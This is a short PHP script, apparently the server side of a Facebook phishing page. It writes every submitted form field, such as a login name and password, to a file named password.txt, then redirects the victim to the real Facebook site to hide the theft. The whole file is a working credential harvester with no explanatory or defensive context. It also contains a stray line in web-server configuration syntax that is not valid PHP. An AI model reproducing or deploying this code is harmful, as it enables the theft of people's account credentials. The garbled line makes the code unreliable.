<?php
header ('Location: https://www.facebook.com ');
$handle = fopen("password.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "===============\r\n");
fclose($handle);
error_page 405 = $https://www.facebook.com
exit;
?>
